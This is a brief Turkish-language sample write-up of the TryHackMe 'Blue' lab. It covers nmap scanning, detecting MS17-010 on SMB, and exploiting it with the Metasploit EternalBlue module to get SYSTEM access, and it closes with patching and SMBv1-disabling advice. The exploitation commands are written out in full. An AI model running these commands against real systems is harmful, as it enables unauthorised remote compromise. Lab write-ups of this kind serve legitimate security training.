# Blue — TryHackMe

> Örnek writeup. Kendi writeup'larını `writeups/icerik/` altına aynı klasör mantığıyla ekle.

**Zorluk:** Kolay · **Konu:** Windows, SMB, EternalBlue

## Özet

Hedef makinede SMB servisindeki MS17-010 (EternalBlue) zafiyeti kullanılarak
SYSTEM yetkisi elde edildi.

## 1. Keşif

```bash
nmap -sV -sC -oN nmap.txt 10.10.10.10
```

445/tcp (SMB) portu açık.

## 2. Zafiyet Tespiti

```bash
nmap -p445 --script smb-vuln-ms17-010 10.10.10.10
```

| Alan | Değer |
|------|-------|
| Zafiyet | MS17-010 |
| Durum | VULNERABLE |

## 3. Sömürü

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
run
```

Sonuç: `nt authority\system`

## Sonuç

- SMB güncel tutulmalı, MS17-010 yaması uygulanmalı.
- SMBv1 devre dışı bırakılmalı.
